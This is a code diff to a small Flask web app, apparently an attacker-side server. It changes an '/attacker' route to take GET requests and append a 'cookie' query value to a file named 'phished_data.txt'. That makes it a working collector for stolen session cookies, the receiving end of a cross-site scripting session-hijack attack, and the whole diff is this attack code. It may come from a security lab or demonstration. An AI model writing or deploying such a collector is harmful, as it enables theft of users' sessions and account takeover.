@@ -6,9 +6,12 @@ data = "D"
 def hello_world():
     return "<p>Hellos, World!</p> " + data 
 
-@app.route("/attacker",methods = ['POST'])
+@app.route("/attacker", methods = ['GET'])
 def attacker():
-    data = request.form.get('data')
-    with open('phished_data.txt', 'w') as file:
-        file.write(data)
+    session_cookie = request.args.get('cookie')
+    file = open("phished_data.txt", "a")
+    file.write(session_cookie)
+    file.write("\n")
+    file.close()
+
     return " "
